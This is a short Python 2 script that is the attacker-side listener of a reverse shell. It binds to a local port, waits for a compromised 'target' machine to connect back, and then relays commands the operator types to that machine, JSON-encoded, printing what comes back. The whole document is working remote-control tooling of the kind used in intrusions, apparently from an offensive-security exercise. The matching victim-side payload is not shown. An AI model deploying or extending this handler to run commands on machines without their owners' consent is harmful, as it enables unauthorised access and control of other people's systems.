#!/usr/bin/python
#
import socket
#from termcolor import colored
import json
import base64

host ='localhost'
port =1234

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024)
			return json.loads(data.decode('utf8'))
		except ValueError:
			continue


def shell():
	while True:
		command =raw_input("* shell#~%s:" %str(ip))
		reliable_send(command)
		if command == 'q':
			break
		else:
			result = reliable_recv()
			print (result)



def connect():
	global target
	global ip
	global s
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind((host,port))
	s.listen(5)
	print ("[*] Listen For Incomming Connecti0n ")
	target,ip = s.accept()
	print ("[*] connection establised %s " % str(ip))


connect()
shell()
s.close()
